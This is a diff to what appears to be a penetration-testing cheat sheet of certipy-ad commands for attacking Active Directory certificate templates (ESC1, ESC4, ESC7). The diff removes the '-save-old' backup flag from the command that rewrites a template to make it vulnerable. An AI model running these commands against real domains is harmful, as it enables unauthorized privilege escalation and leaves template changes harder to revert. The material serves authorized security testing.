@@ -53,7 +53,7 @@ certipy-ad req -u <user>@<domain> -p '<password>' -target <ca-fqdn> -template <t
 ## certipy-ad - modify template in order to make it vulnerable to ESC1 - ESC4
 #plateform/linux #target/remote #cat/ATTACK
 ```
-certipy-ad template -u <user>@<domain> -p '<password>' -template <template> -save-old
+certipy-ad template -u <user>@<domain> -p '<password>' -template <template>
 ```
 
 ## certipy-ad - Issue certificate for specific request id - ESC7
